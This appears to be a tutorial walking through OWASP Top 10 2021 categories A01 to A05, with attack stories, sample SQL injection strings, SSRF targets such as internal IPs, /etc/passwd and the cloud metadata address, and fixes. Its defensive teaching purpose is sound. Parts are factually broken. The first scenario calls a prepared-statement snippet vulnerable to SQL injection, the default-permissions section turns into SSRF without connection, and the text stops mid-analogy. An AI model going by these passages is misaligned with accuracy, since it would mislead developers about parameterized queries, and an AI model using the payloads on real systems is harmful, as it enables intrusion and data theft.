# A01:2021 – Broken Access Control
### Scenario #1: SQL Injection Attack Risk

In this scenario, when the application processes a user's request for account information, it directly injects the parameter (`acct`) obtained from the HTTP request into the SQL query without proper validation or escaping. The code snippet is as follows:

```java
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery();
```

When a user accesses the application via the URL `https://example.com/app/accountInfo?acct=notmyacct`, if the supplied `acct` parameter is not strictly validated, an attacker can exploit this by modifying the value of the `acct` parameter to inject malicious SQL code. For example, an attacker might try entering a string like `admin' OR '1'='1` as the `acct` value, which could cause a query that was originally expected to return only a specific user's account information to instead return information for all users, because the malicious input turns the SQL logic into an always-true condition.

### Risks and Consequences
- **Data breach**: Attackers may be able to obtain sensitive information of all users in the database, such as usernames, password hashes, email addresses, etc.
- **Privilege escalation**: In some cases, attackers may even use carefully crafted SQL commands to modify database contents, such as elevating the privileges of their own account.
- **Service disruption**: In extreme cases, attackers may perform delete operations, destroying database data and causing the service to become unavailable.

### Solutions
- **Parameterized queries**: Use prepared statements and parameterized queries to prevent SQL injection, ensuring that user-supplied data is treated as data rather than code.
- **Input validation**: Strictly validate all user input to ensure its format matches expectations.
- **Principle of least privilege**: Applications should connect to the database using an account with the minimum necessary privileges, so that even if an attack occurs, the scope of damage is limited.

### Scenario #2: Unauthorized Access Control Vulnerability

The two URLs mentioned point to a regular application information page and an admin page respectively:

- `https://example.com/app/getappInfo`
- `https://example.com/app/admin_getappInfo`

If unauthenticated users can directly access either page—especially the admin page—this indicates a serious access control flaw in the application.

### Risks and Consequences
- **Information disclosure**: A non-admin user accessing `/app/admin_getappInfo` may expose sensitive administrative information, such as system configuration, user lists, backend operation logs, etc.
- **Privilege escalation**: If unauthorized users can perform administrative operations, such as modifying system settings or deleting user accounts, this seriously threatens the security and stability of the system.
- **Compromised system integrity**: A lack of proper access control may allow attackers to move laterally within the system and further penetrate the network.

### Solutions
- **Implement strict authentication mechanisms**: Ensure that all sensitive pages and features require user authentication before access.
- **Authorization checks**: Before executing any page or feature that requires access control, verify that the user has the corresponding access permissions.
- **Use HTTPS**: Ensure all communications are encrypted to prevent man-in-the-middle attacks from stealing user credentials or manipulating requests.
- **Session management**: Implement secure session management mechanisms, such as session timeouts and protection against session hijacking, to increase the difficulty of attacks.

# A02:2021 – Cryptographic Failures
### Scenario #1: Automatically Decrypted Credit Card Numbers and SQL Injection

**Attack description**:
An application system was designed to protect credit card information by automatically encrypting this sensitive data when storing it in the database. However, when the application needs to read this data, it automatically decrypts it for use. Unfortunately, if the application directly uses user-supplied data when building SQL queries (for example, through GET or POST request parameters) without proper input validation and sanitization, this leaves an opening for SQL injection attacks. An attacker can craft special query parameters, such as inserting SQL code into the "acct" field, to bypass the application logic and directly extract unencrypted credit card numbers from the database.

>  Because the credit card information in the database is stored in plaintext form (although it is encrypted when stored, it is automatically decrypted when read), when the database responds to this malicious query, it will include the plaintext information of all credit card records, including sensitive data such as card numbers, expiration dates, and security codes.

**Risks and consequences**:
- **Data breach**: Attackers can easily obtain large amounts of credit card information, leading to fraudulent charges against users' funds.
- **Reputational damage**: Companies may face lawsuits, fines, and severe damage to their brand image as a result of data breaches.

**Solutions**:
- Use prepared SQL statements to prevent SQL injection.
- Strictly validate and sanitize all user input.
- Restrict operational permissions on sensitive data so that it cannot be decrypted directly even through SQL injection.

### Scenario #2: Weak SSL/TLS Usage and Session Hijacking


To help you better understand this scenario, we can construct a concrete example:

Suppose there is an online banking website, BankExample.com. Some pages of the site (such as the homepage and promotional pages) use HTTPS, but its login page and transaction pages do not enforce HTTPS, or after a user logs in, some internal links unexpectedly lead to HTTP pages. This creates a security risk.

**Attack process**:

1. **Man-in-the-middle attack preparation**: The attacker (whom we'll call Alice) is in a public place, such as a coffee shop, which offers an unsecured public Wi-Fi hotspot. Alice sets up a man-in-the-middle attack tool, such as a rogue Wi-Fi access point with a name similar to the coffee shop's official Wi-Fi, to trick users into connecting. User Bob, a customer of BankExample.com, unknowingly connects to this rogue Wi-Fi.

2. **HTTPS downgrade attack**: Bob decides to log in to his online bank account to make a transfer. When he enters the URL of BankExample.com, due to a design flaw in the website, Bob is redirected to an HTTP page instead of the expected HTTPS page. As the man in the middle, Alice intercepts Bob's request and prevents it from establishing a connection with the real HTTPS server, while sending Bob a fake HTTP response page that makes everything look normal—but in reality, Bob is now interacting with a server controlled by Alice.

3. **Session hijacking**: Bob enters his login credentials on the fake HTTP page, and Alice captures this information. Once Bob logs in, the bank's website assigns him a session cookie to maintain his logged-in state. Because the communication is unencrypted, Alice can also intercept this session cookie. At this point, Alice has all the information necessary to impersonate Bob and access his bank account.

4. **Privacy data access and modification**: Using the intercepted session cookie, Alice can access Bob's account and view private information such as his account balance and transaction history. Even more dangerously, Alice can initiate new transactions, such as changing the payee account number to transfer funds into her own account—all without Bob noticing anything until he receives a transaction notification from the bank or checks his account and discovers the anomaly.

**Preventive measures**:

- **Site-wide HTTPS**: Ensure that all pages and services of the website use HTTPS, and use the HSTS (HTTP Strict Transport Security) header to force browsers to always use HTTPS connections.
- **Encryption strength**: Regularly update SSL/TLS certificates and avoid using cipher suites known to be weak.
- **Educate users**: Remind users to be wary of insecure network environments and avoid performing sensitive operations over public Wi-Fi unless using a reliable VPN service.
- **Monitoring and response**: Sensitive services such as banks should implement real-time monitoring to detect abnormal login behavior and promptly notify users of potential security risks.

### Scenario #3: Insecure Password Storage and Rainbow Table Attacks

**Attack description**:
Let's illustrate this problem with a simplified story:

**Story background**:
Imagine a website called "SafeLogin" that is responsible for storing users' login credentials. To "protect" these passwords, SafeLogin decides to store them using the MD5 hash function, but overlooks the importance of salting. In addition, the website has a file upload feature that allows users to upload personal avatars, but due to negligence during development, this feature does not adequately check uploaded file types, resulting in a security vulnerability.

**Attack steps**:

1. **Discovering the vulnerability**: A hacker named Alex discovers SafeLogin's file upload vulnerability and exploits it to upload a malicious script file disguised as an image. Once executed, this script can access the file system on the server, including the database storing user password hashes.

2. **Database breach**: Alex successfully downloads the entire password database through the malicious script. Because the database stores unsalted MD5 hash values, the attack becomes relatively straightforward.

3. **Rainbow table attack**: Alex has prepared a series of rainbow tables in advance; these rainbow tables contain millions of common passwords and their corresponding MD5 hash values. By comparing the hash values obtained from the database against the rainbow tables, Alex can quickly find the original passwords of many users. For example, if a user's password is "123456", its corresponding MD5 hash value can easily be found in a rainbow table, and the password is thereby cracked.

4. **The limitations of salting**: Suppose SafeLogin later realizes the risk and starts salting passwords, but still uses a relatively weak hashing algorithm such as SHA-1. Although salting does increase the difficulty of cracking—because each user's password hash is now unique—if the hashing algorithm itself is vulnerable to GPU cracking, an attacker can use brute force, trying various password combinations and computing their salted hash values until finding one that matches a hash in the database. For some simple or common passwords, this can be completed within an acceptable amount of time.

**Summary**:
In this example, an insecure password storage method (such as using a simple hash function without salting) combined with a file upload vulnerability allows an attacker to easily obtain and crack user passwords. Even if salting measures are later adopted, if the hashing algorithm is chosen inappropriately, the system's security remains questionable. This underscores the importance of using strong hashing algorithms (such as bcrypt, scrypt, or argon2) and implementing a salting strategy when designing password storage schemes.

When a website or application uses the MD5 hash function to store user passwords, it converts the user's plaintext password into a fixed-length hash value through the MD5 algorithm. For example, suppose a user sets the password "password123"; without salting, the system directly computes the MD5 hash of this password, which might be a string like "482c811da5d5b4bc6d497ffa98491e38", and then stores this hash value in the database.

**An example explaining the importance of not ignoring salting:**

1. **What is salting?** Salting means adding a randomly generated string (called a salt value) to a password before converting it into a hash value. The purpose of this is to ensure that even if users have the same password, their hash values will differ because of the different salt values, thereby increasing the difficulty of cracking.

2. **The risks of not salting:**
   
   - **Rainbow table attacks**: Without salting, attackers can precompute the MD5 hash values of a large number of common passwords and build them into rainbow tables. Once the database is leaked, attackers only need to compare the leaked hash values against the rainbow tables to quickly identify the original passwords of many users. For example, if the MD5 hash value of "password123" appears in a rainbow table, the attacker immediately knows the corresponding plaintext password.
   
   - **Same password, same hash**: If no salt is added, any identical password chosen by users, such as "123456", will be stored as the same MD5 hash value in the database. This means that once one hash value is cracked, all accounts using that password are at risk.

3. **How salting changes this situation:**
   
   Suppose both User A and User B choose the password "123456", but the system adds a different salt value to each password. User A's salt value is "abc123", and User B's salt value is "xyz789". When storing, the system actually computes the MD5 hash values of "123456abc123" and "123456xyz789", which are completely different. Even if an attacker has a powerful rainbow table, they cannot directly match the original password, because what they face are salted hash values rather than hashes of pure passwords.

In summary, through salting, even if attackers obtain the stored hash values, it is difficult for them to directly derive the original passwords using rainbow tables, significantly enhancing the security of password storage.

**Risks and consequences**:
- **Account takeover**: User accounts are illegally accessed, which may lead to personal information disclosure or further fraudulent activity.
- **System penetration**: Using one account as a springboard, attackers may penetrate deeper into the system.
- **Legal liability**: Violating data protection regulations, facing fines and lawsuits.

**Solutions**:
- Use strong password hashing algorithms such as bcrypt, scrypt, or argon2, which are designed to resist GPU cracking.
- Apply an independent random salt value to each password to increase cracking difficulty.
- Regularly review and patch all vulnerabilities that could expose sensitive data, such as file upload vulnerabilities.
- Implement multi-factor authentication to add an extra layer of security.


# A03:2021 – Injection Attacks
In both of these scenarios, the way the application is written contains SQL injection vulnerabilities, because user-supplied data is directly concatenated into the SQL query string without proper validation or escaping. Through carefully crafted input, attackers can manipulate the logic of SQL queries and perform unintended database operations.

### Scenario #1: Direct SQL Query

The original query statement is:
```java
String query = "SELECT * FROM accounts WHERE custID='" + request.getParameter("id") + "'";
```

When an attacker enters `' OR '1'='1` as the `id` parameter, the complete query becomes:
```sql
SELECT * FROM accounts WHERE custID='' OR '1'='1'
```

Here `'1'='1'` is always true, so the query condition becomes always-true logic, which causes the query to return all records in the `accounts` table instead of only the record for a specific customer ID.

### Scenario #2: Using Hibernate Query Language (HQL)

Although HQL looks slightly different from direct SQL, it carries the same injection risk when no security handling is applied:
```java
Query HQLQuery = session.createQuery("FROM accounts WHERE custID='" + request.getParameter("id") + "'");
```

When the same attack input `' OR '1'='1` is used, the HQL query becomes:
```hql
FROM accounts WHERE custID='' OR '1'='1'
```

Since HQL is ultimately converted into SQL for execution, the above HQL likewise results in querying all account records, because `'1'='1'` is an always-true condition.

### A More Dangerous Attack Example: Time-Based Injection Attack

The request sent by the attacker looks like:
```http
http://example.com/app/accountView?id=' UNION SELECT SLEEP(10);--
```

In this example, the attacker attempts to use time-based injection to test whether a vulnerability exists. For Scenario #1 (direct SQL), the query after the attack may become:
```sql
SELECT * FROM accounts WHERE custID='' UNION SELECT SLEEP(10); --
```

Here, the `UNION` operator is used to join two queries, and the `SLEEP(10)` function makes the database server pause execution for 10 seconds. If the server's response time increases significantly, the attacker can infer that the injection succeeded and can further explore the database structure, or even perform more complex malicious operations.

For Scenario #2 (HQL query), although directly using `UNION` and `SLEEP` may not work in HQL (because they are SQL-specific), the principle is similar; attackers may look for HQL-specific vulnerabilities or functions to achieve the same goal, such as using particular HQL functions or clauses to verify the existence of an injection point.

In short, the code in both cases is highly vulnerable to SQL injection attacks. The correct approach is to use prepared query statements or parameterized queries, ensuring that user-supplied data cannot affect the structure of the SQL statement.

# A04:2021 – Insecure Design
### Scenario #1: Problems with the Question-and-Answer Mechanism in Credential Recovery
### Attack Scenario Example: The "Question and Answer" Risk in Credential Recovery

**Scenario description**:
Suppose there is an online banking system, and user Xiao Li has forgotten his login password and needs to regain access through a "question and answer" method. The system asks him a preset security question: "What was the name of your first pet?" After Xiao Li answers correctly, the system allows him to reset his password.

**Attack path**:
1. **Social engineering**: Xiao Li once shared photos of his childhood pet on social media and mentioned that the pet's name was "Doudou". Hacker Xiao Zhang learns this information by monitoring Xiao Li's social media accounts.
2. **Credential recovery abuse**: Xiao Zhang attempts to log in to Xiao Li's bank account and deliberately enters a wrong password to trigger the password recovery process. When the system asks the security question "What was the name of your first pet?", Xiao Zhang enters "Doudou" and successfully bypasses this verification step.
3. **Account takeover**: With the successful "question and answer" verification, Xiao Zhang resets Xiao Li's login password and takes full control of Xiao Li's bank account, enabling him to transfer funds, view sensitive information, and perform other operations.

**Consequences**:
- Xiao Li's financial security is directly threatened, and he may suffer property losses.
- The bank's reputation is damaged, facing a customer trust crisis and potential legal liability.
- This demonstrates the significant security risks of the "question and answer" verification mechanism in real-world applications.

**Improvement measures**:
To address this security issue, banks should follow the guidance of NIST 800-63b, OWASP ASVS, and the OWASP Top 10, adopting more secure authentication methods to replace "question and answer", such as:
- **Multi-factor authentication**: Combining multiple verification methods such as SMS codes, email verification codes, hardware tokens, or biometrics.
- **Temporary access passwords**: Sending one-time-use passwords through secure channels instead of relying on preset questions.
- **Dynamic knowledge-based authentication**: If knowledge-based authentication must be used, it can be designed around dynamic questions based on user behavior, such as recent transaction details, reducing the likelihood that the information is known to third parties.
- **Account activity monitoring**: Strengthen monitoring of account login and operation behavior, with alerts and intervention for abnormal login locations, times, or behavior patterns.

Through the above measures, account security can be significantly improved and the risk of unauthorized access reduced.

### Scenario #2: Movie Theater Group Booking Vulnerability

**Problem description**:
An attacker exploits the system's lax restrictions on group bookings, attempting to book seats beyond the allowed limit, which may cause revenue loss for the movie theater.
This insecure design is mainly reflected in the following key points:

1. **Insufficient upfront validation in the booking process**: The movie theater allows group booking discounts without collecting a deposit. This design oversight gives attackers an opportunity, because they can probe and abuse the booking system without any financial cost.

2. **Missing concurrent booking restrictions**: The system has no effective mechanism to limit or detect concurrent booking requests, especially a large number of requests coming from the same source or related sources within a short period of time. Attackers can exploit this by using automated scripts to send multiple group booking requests to the system simultaneously, each within the single-request limit (15 viewers), but cumulatively far exceeding the limit, reaching 600 or even more seats.

3. **Lack of real-time seat inventory management**: When processing booking requests, the system fails to update and lock seat inventory in real time, resulting in multiple requests being able to book the same seats. This design flaw allows attackers to easily "book" more seats than are actually available through a large number of concurrent requests.

4. **Simple verification and authorization mechanisms**: For group booking requests, the system may only perform basic numeric validation (such as no more than 15 people), without implementing advanced security measures such as complex user identity verification, device fingerprinting, or behavioral analysis to identify and block malicious behavior.

5. **Lack of a global view and booking aggregation logic**: The system has no centralized logic to aggregate and immediately evaluate all pending booking requests to ensure that the total booking volume does not exceed the theater's actual capacity. This allows attackers to exploit the system's isolated handling of individual requests to cumulatively carry out large-scale overbooking.

In summary, this insecure design exposes obvious weaknesses of the movie theater booking system in concurrency handling, booking validation, inventory management, and security defense mechanisms, leaving room for malicious attackers to exploit and potentially causing serious impact and revenue loss to the theater's operations.

**Solutions**:
- **Implement strict quantity validation**: Optimize the system logic to ensure that the total number of booked seats does not exceed the prescribed limit, whether in a single request or in concurrent requests. Distributed locking mechanisms or database transactions can be used to update and lock seat status in real time, preventing overselling.

> Concurrency handling vulnerability: The system may not have adequately considered concurrency control—that is, when multiple requests arrive almost simultaneously, the system may process these requests in parallel, and each request, when processed, checks and concludes that the current booking quantity has not reached the limit, so they all pass the initial booking validation. But when all requests are finally submitted and the database is updated, the cumulative number of booked seats may exceed the intended limit.

- **Phased validation**: First let users submit a booking application, then confirm compliance through manual review or automatic system checks of the booking scale before collecting the deposit.
- **IP tracking and rate limiting**: Monitor abnormally frequent booking requests and limit the booking frequency of individual IP addresses.

### Scenario #3: E-Commerce Website Defending Against Scalper Bots

**Problem description**:
The website lacks effective mechanisms to prevent scalpers from using automated tools to snap up graphics cards, harming the interests of legitimate consumers.


Scenario #3 describes an insecure design, specifically involving the following aspects:

1. **Lack of anti-scalper mechanisms**: In the design of the e-commerce website, measures to prevent scalper bots (automated scripts) from snapping up products were not fully considered or deployed. High-end graphics cards, as a scarce commodity, have become a primary target for scalpers. Because the website lacks effective protection, scalpers can use automated tools to quickly buy up large quantities of graphics cards, leaving consumers with genuine demand unable to purchase them.

2. **Publicity effect and customer dissatisfaction**: This situation not only damages the brand image of the retailer and the graphics card manufacturers—because the public will believe they failed to take the necessary measures to protect consumer interests—but also creates widespread negative publicity. Meanwhile, consumers who cannot buy the products they want feel frustrated and dissatisfied, and may express their discontent through social media and other channels, further amplifying the negative impact.

3. **Suggested solutions**:
   - **Implement anti-bot verification**: Use complex CAPTCHAs or behavioral analysis to distinguish human users from bots, increasing the difficulty of automated script operations.
   - **Dynamic purchase time windows**: Instead of fixed product release times, release inventory at random times, making it difficult for scalpers to predict and prepare in advance.
   - **Purchase limits and identity verification**: Set a purchase quantity limit for each user and require stricter identity verification, such as binding a mobile phone number, credit card verification, etc.
   - **Order review and manual intervention**: Automatically review large orders or abnormal purchasing behavior, with manual re-examination when necessary, rejecting suspicious transactions.
   - **Time-delayed purchasing**: Set a short waiting time, such as a few seconds; normal users can complete their purchase, while the rapid operations of bots may be identified and blocked.
   - **AI analysis and learning**: Use artificial intelligence technology to analyze purchasing patterns, identify and block abnormal purchasing behavior, and continuously learn and adapt to new scalper strategies.

Through the above measures, retailers can significantly improve the security and fairness of their e-commerce platforms, protect the rights of genuine consumers, and also safeguard their own and their suppliers' market reputation.

# A05:2021 – Security Misconfiguration



### Scenario #1: Default Sample Programs Not Removed

#### Vulnerability explanation
Default sample programs not being removed—especially an administration interface with known security flaws that has a default account and password—provides attackers with a direct intrusion path. Once attackers log in through these default credentials, they can easily gain control of the server, steal data, plant malware, or carry out other illegal activities.


The security misconfiguration in this example lies in the use of a default sample program with known vulnerabilities, in particular the administration interface that retains the default account and password. Such a configuration opens the door to potential attackers, allowing them to log in to the system through the default credentials without a complex cracking process. Once logged in successfully, attackers can operate on the server with almost no restrictions, including but not limited to stealing data, installing malware, tampering with or deleting important information, thereby posing serious security threats and data breach risks to the organization.

The proposed solutions address the above flaws and aim to strengthen system security, specifically including:

1. **Remove default sample programs**: Before the server is officially put into operation, comprehensively clean up all demo, test, or sample programs. These programs often come with the development environment or initial installation package but serve no practical purpose in a production environment, and may instead become security risks.

2. **Change default credentials**: All accounts, especially administrator accounts with high privileges, must have their default passwords changed. Set strong passwords that are not easy to guess, and establish a mechanism for regularly changing passwords to reduce the risk of passwords being cracked.

3. **Principle of least privilege**: Assign permissions according to the actual needs of each user or system component, ensuring that no account or process has more permissions than necessary to perform its tasks. This way, even if an account is compromised, the attacker cannot gain control of the entire system.

4. **Access control and auditing**: Implement strict access control measures to ensure that only authorized users can access specific resources. At the same time, by recording and monitoring all login activity and permission usage, abnormal access or potential threats can be discovered and addressed in a timely manner, providing a basis for incident investigation.

Combining these solutions can greatly improve system security and reduce the security risks caused by improper default configurations.

### Scenario #2: Open Directory

#### Vulnerability explanation
An open directory listing allows attackers to browse and download Java files on the server. By decompiling these files, attackers can discover and exploit access control flaws within them, potentially obtaining sensitive information or taking control of the server.

> When a server's directory is configured to be open and browsable, it means that any internet user can access all the files listed under that directory through a browser. Typically, web applications place publicly accessible resources (such as images, CSS, JavaScript files, etc.) in specific public directories, while backend code files like compiled Java `.class` files should be kept in locations that cannot be accessed directly via URL, to prevent unauthorized access.
If misconfiguration causes a directory containing `.class` files to also be browsable, then these files can be downloaded by anyone, just like other public files on the website. `.class` files are the product of compiled Java source code. Although they are not directly readable text-form source code, with the help of decompilation tools, attackers can relatively easily convert this bytecode back into a form close to the original source code.
In this process, if the source code contains poor security practices—such as database connection strings, API keys, passwords, and other sensitive information being hard-coded (written directly in the code instead of being managed through configuration files or environment variables)—then this sensitive information will be exposed to attackers along with the source code. Attackers can use this information to try to log in to databases, abuse API permissions, or perform other malicious operations, thereby seriously threatening system security and data confidentiality.
Therefore, the correct approach is to ensure that all files containing sensitive information or application backend logic are stored in protected directories, and that the server is properly configured to prohibit these directories from being publicly exposed. At the same time, follow secure programming practices, avoid hard-coding sensitive information in code, and adopt secure configuration management strategies to harden system security.

This security misconfiguration involves improper web server configuration—specifically, the server has directory browsing enabled, which means that if a URL points to a directory rather than a specific file, the server automatically generates a page listing all files and subdirectories in that directory for the visitor. This is a potential entry point for attackers, with specific harms including:

1. **Information disclosure**: By browsing the directory structure, attackers can learn about the server's file organization, application architecture, and other information, which may help them better plan further attack paths.

2. **Code download**: In the example mentioned, the open directory contains Java files (usually `.class` files). Although these files are already compiled bytecode, with decompilation tools (such as JD-GUI, CFR, Procyon, etc.), attackers can relatively easily recover most of the original source code. The source code may contain sensitive information such as database connection strings, API keys, and hard-coded passwords, and the exposure of this information directly threatens system security.

3. **Discovering and exploiting vulnerabilities**: Through the source code obtained by decompilation, attackers can review the application's internal logic in detail, looking for potential security vulnerabilities such as insecure input validation, access control mistakes, and sensitive operations lacking authentication. Once such flaws are discovered, attackers can design targeted attacks, such as injection attacks and unauthorized operations, to obtain sensitive data, tamper with content, or completely take over the server.

Methods to solve this problem include:

- **Disable directory browsing**: In the web server's configuration (such as Apache's `.htaccess` file, Nginx's configuration file, etc.), explicitly disable the directory browsing feature.
- **Remove or protect sensitive files**: Ensure that important configuration files, source code files, etc. are not placed directly in publicly accessible directories, or use access control lists to restrict access to these files.
- **Use protection measures for compiled code**: Although Java bytecode can be decompiled, techniques such as code obfuscation and packing can increase the difficulty of decompilation.
- **Regular code review and security audits**: Conduct regular code reviews and security audits to promptly discover and fix potential security vulnerabilities and reduce the attack surface.


### Scenario #3: Error Messages

#### Vulnerability explanation
Error messages that contain too much detail, especially stack traces, may leak sensitive information such as server architecture, internal paths, and database configuration, providing attackers with valuable intelligence that makes it easier for them to further tailor their attack strategies.


Scenario #3 describes a security misconfiguration involving improper server configuration, specifically manifested as the server returning detailed error messages to users when errors occur, including stack traces. A stack trace is a diagnostic tool used to show the order in which functions or methods are called during program execution, as well as the specific location at each level, and is commonly used by developers to debug program errors. However, when this information is displayed directly to end users, it may cause the following security problems:

1. **Sensitive information disclosure**: Stack traces may contain sensitive information such as internal file paths of the server, database query statements, and environment variable contents. Exposing this information to external users is tantamount to making the details of the system architecture and configuration public, increasing the risk of attackers using this information to carry out deeper attacks.

2. **Vulnerability exposure**: Error messages may indirectly reveal the specific version numbers of the software libraries, frameworks, or languages in use, especially when these components have known security vulnerabilities. Attackers can use this information to look up corresponding exploit code and launch targeted attacks, such as SQL injection, remote code execution, etc.

3. **Expanded attack surface**: Detailed error messages provide attackers with clues about the system's operating status and defense mechanisms, helping them better understand where the system's weaknesses lie and thereby design more effective attack strategies.

Solutions include:

- **Limit error message output**: In production environments, servers and applications should be configured to show users only generic error messages, without including stack traces or other sensitive details. This can be achieved by modifying the application's error handling logic or configuring the error reporting level of the web server and application framework.

- **Logging**: Detailed error information should be recorded only in server-side log files, and access permissions to these log files should be restricted, authorized only to system administrators or the security team.

- **Use secure error reporting tools**: Dedicated error monitoring and reporting services can be deployed; these services can collect detailed error information and provide it to the development team while keeping the end-user interface clean and secure.

- **Regular updates and patching**: Even if error information is leaked, regularly updating software components and application systems and patching known security vulnerabilities can effectively reduce the likelihood of successful attacks.

Through the above measures, the security risks caused by improper exposure of error information can be greatly reduced.

### Scenario #4: Default Permission Sharing Settings

#### Vulnerability explanation
The default permission sharing settings of a cloud server may cause sensitive data stored in the cloud to be accessed by unauthorized CSP (cloud service provider) users, due to overly permissive permission settings or unadjusted default settings.


Default permission sharing settings refer to the access control rules configured by default in cloud servers or cloud services; these rules determine who can access, modify, or manage specific cloud resources, such as storage buckets, databases, files, or applications. SSRF (Server-Side Request Forgery) is a security vulnerability that allows attackers to deceive the server side of a vulnerable web application into initiating requests. This means attackers can force the server to access an arbitrary URL of their choosing, which typically includes internal network resources that are impossible or restricted to access directly from the external network. The following simplified example illustrates how SSRF helps access the internal network:

#### Step-by-step breakdown:

1. **External user attack**: After noticing this feature, the attacker tries submitting a URL pointing to an internal network address, such as `http://192.168.1.10/admin`, instead of a public internet address.

2. **Server makes the request on their behalf**: After website A's server receives this request, due to a design flaw in the feature, it does not correctly verify the validity or origin of the URL and directly attempts to access this internal network address.

3. **Internal network access permissions**: Website A's server is located on the company's internal network, so it has permission to access other internal network resources. When it attempts to access the internal network URL provided by the attacker, it is actually using its internal network privileges to initiate the request.

4. **Information disclosure or further attacks**: If services on the internal network (such as the aforementioned `http://192.168.1.10/admin`) have security vulnerabilities or are misconfigured, attackers may be able to obtain sensitive information through this path, perform unauthorized operations, or even further penetrate the internal network.

### Summary of SSRF harms:

- **Internal network probing**: Attackers can use SSRF vulnerabilities to enumerate services and devices on the internal network.
- **Service exploitation**: If vulnerable services are discovered, such as unauthorized APIs or legacy web applications, further attacks can be launched.
- **Data breaches**: Accessing internal databases or file systems to steal sensitive data.
- **Command execution**: Under specific conditions, such as in combination with other vulnerabilities (like unauthorized Redis access), remote code execution can be achieved.

Through the above example, we can see that the reason SSRF vulnerabilities can access the internal network is that they exploit servers within the trust boundary as a springboard, bypassing the restrictions on directly accessing the internal network from the external network, thereby achieving the goal of attacking internal network systems. The following is a detailed explanation of several attack scenarios:


### Scenario 1: Port Scanning of Internal Servers

When the network architecture is not properly segmented, attackers can use SSRF (Server-Side Request Forgery) vulnerabilities or other methods to initiate a large number of port connection requests to internal servers. By analyzing the response times, error codes, or connection statuses of these requests, attackers can infer which ports are open and which are closed. For example, a quick rejection response may mean the port is closed or protected by a firewall, while a longer response time or a specific HTTP status code may indicate that a service is running. In this way, attackers can map out the internal network services and select targets for subsequent attacks.

When attackers want to understand the structure and security status of an internal network, they may attempt to use SSRF (Server-Side Request Forgery) vulnerabilities to perform port scanning. Below is a concrete example to illustrate this process:

### Example scenario:

Suppose an attacker discovers a website B that has an SSRF vulnerability, allowing arbitrary URLs to be submitted for the server to access. Website B's server is located on the company's internal network and is connected to other internal servers.

### Steps to carry out the port scan:

1. **Constructing requests**: The attacker first constructs a series of request URLs carrying different port numbers, targeting the IP of a certain server on the internal network, such as `http://192.168.1.20:1-1000` (this is a simplified representation; in practice, each port needs to be tried one by one).

2. **Sending through the SSRF vulnerability**: Through website B's vulnerability, the attacker submits these carefully constructed URLs. Each submission attempts to access a different port of the internal server.

3. **Analyzing responses**:
   - **Time delays**: For open ports, the server may have a specific response time, while closed ports may result in faster error responses. Attackers can infer port status by analyzing these time differences.
   - **Connection status**: If the server returns specific TCP responses for certain port requests (such as RST indicating the port is closed, SYN-ACK indicating the port is open but the three-way handshake was not completed, and no response possibly meaning firewall blocking or the port is not listening), attackers can determine port status based on these responses.
   - **HTTP status codes**: For web services, HTTP 200 may mean the service is running normally, while something like 404 or no response may correspond to different situations.

4. **Aggregating information**: Through a large number of attempts and analysis, attackers can gradually build a map of the target internal server's open ports, identifying which services (such as HTTP, SSH, database services, etc.) are running on which ports.

### Resulting impact:

- **Information disclosure risk**: Knowing which services and their ports are open, attackers can specifically look for known vulnerabilities in these services for the next step of attack.
- **Internal network penetration**: Open management interfaces, unauthorized service access, etc. may all become entry points for attackers to enter the internal network.
- **Security policy assessment**: Exposed services may also reflect deficiencies in internal security policies, such as the lack of necessary access controls and firewall rules.

In summary, even if the network architecture is not explicitly segmented, attackers can still perform port scanning through SSRF vulnerabilities, laying the foundation for subsequent attack operations. This underscores the importance of protecting internal networks from SSRF attacks, including strengthening input validation, implementing strict network segmentation strategies, and regularly auditing the security configuration of network services.
### Scenario 2: Confidential Data Leakage

In some cases, SSRF vulnerabilities may allow attackers not only to access servers on the internal network but also to access the local file system or sensitive data stored in internal services through carefully crafted requests. For example, if a web application has a vulnerability that allows URL parameters to directly read files, attackers may attempt to access files such as `/etc/passwd` (which contains user account information on Linux systems) or configuration files of internal databases. In this way, attackers can illegally obtain usernames, passwords, keys, or business-sensitive information, causing serious information leakage.


Suppose there is a web application, one of whose features is to help users check whether a certain webpage is accessible. To implement this feature, the application receives the URL entered by the user as a parameter, then initiates a request on the server side to access this URL, and displays the request result to the user. This seems to be a convenient feature, but without proper security controls, it may introduce an SSRF vulnerability.

### Exploitation example:

1. **Target identification**: The attacker first learns that the web application has such a feature and realizes that an SSRF vulnerability may exist.

2. **Internal resource guessing and access**: Instead of entering the URL of an external website, the attacker tries to construct a URL pointing to an internal resource, such as `http://localhost/etc/passwd` or `http://127.0.0.1/mysql_config.conf`. The purpose here is to have the server-side application access the local file system or the configuration files of internal services on their behalf.

3. **Bypassing restrictions**: Because the web application may restrict requests that directly access the file system, the attacker may need to use various techniques to bypass these restrictions, such as encoding, path traversal techniques, etc.

4. **Information leakage**: If the server-side application does not correctly verify and filter the user-supplied URL, it may execute this malicious request and attempt to access local files or internal services. When the contents of files containing sensitive information are returned and displayed on the web page, the attacker has successfully obtained this data, such as usernames, password hash values, database credentials, or other sensitive configuration information.

### Consequences:
- **Data breach**: Leakage of sensitive internal enterprise information, including but not limited to user data, system configuration, encryption keys, etc.
- **Further attacks**: The obtained credentials may help attackers further penetrate the enterprise's internal network and carry out deeper attacks.
- **Reputational damage**: Data breaches may cause the company to face lawsuits, declining customer trust, and other problems.

To defend against such attacks, developers should ensure that all user-provided URLs are strictly validated and filtered, block unauthorized access to internal resources, and implement network segmentation and the principle of least privilege to reduce potential damage.
### Scenario 3: Accessing the Metadata Store of Cloud Services

Cloud service providers usually provide a metadata service for running instances, used to store instance identity authentication information, configuration details, and other management data. This service can usually be accessed through a fixed internal IP address, such as HTTP://169.254.169.254/. If attackers can exploit an SSRF vulnerability to access this address, they can read sensitive information such as the cloud instance's access keys and security tokens, and thereby control cloud resources, create or delete services, and even generate additional charges. This attack demonstrates the security challenges unique to cloud environments.


The metadata service is like a detailed personal information secretary, specifically responsible for collecting and providing all the important details about you. Imagine you check into a highly intelligent hotel; this hotel's "metadata service" system can automatically optimize your stay experience based on your preferences and needs. Below is a concrete example to illustrate this point:

### Metadata service example:

Zhang Wei booked a room at a smart hotel. This hotel uses an advanced metadata service system to personalize each guest's stay experience.

1. **Before check-in**: When booking, Zhang Wei filled out a personal preference questionnaire, including his preferred room temperature (22°C), favorite type of coffee (latte), desired wake-up time (7:00 AM), and other information. This information is recorded by the hotel's metadata service system.

2. **At check-in**: Zhang Wei arrives at the hotel and checks in by himself using his mobile phone, with no need to go to the front desk. His room number, check-in date, booking package, and other basic information, as well as the preferences he previously provided, are all integrated by the metadata service to form an exclusive stay profile.

